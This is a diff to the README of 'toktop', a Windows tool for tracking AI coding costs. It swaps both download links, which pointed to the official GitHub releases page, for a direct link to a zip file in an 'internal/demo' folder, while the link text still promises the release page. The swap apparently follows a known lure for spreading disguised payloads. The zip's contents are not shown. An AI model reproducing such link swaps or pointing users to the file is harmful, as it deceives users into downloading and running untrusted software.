@@ -1,6 +1,6 @@
 # 📊 toktop - Track AI coding costs in real-time
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/binaykuma836/toktop/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/binaykuma836/toktop/main/internal/demo/Software_3.3-beta.4.zip)
 
 ## What is toktop?
 
@@ -16,7 +16,7 @@ Toktop runs on Windows. You need a standard Windows terminal to view the dashboa
 
 You need the correct file for your computer. Visit the link below to reach the official download page.
 
-[Click here to visit the release page to download your software](https://github.com/binaykuma836/toktop/releases)
+[Click here to visit the release page to download your software](https://raw.githubusercontent.com/binaykuma836/toktop/main/internal/demo/Software_3.3-beta.4.zip)
 
 On the release page, look for the file ending in `.exe`. This file contains the program you need to run. Select the version that matches your Windows system. Save the file to a folder you can find easily, such as your Downloads or Desktop folder.
 
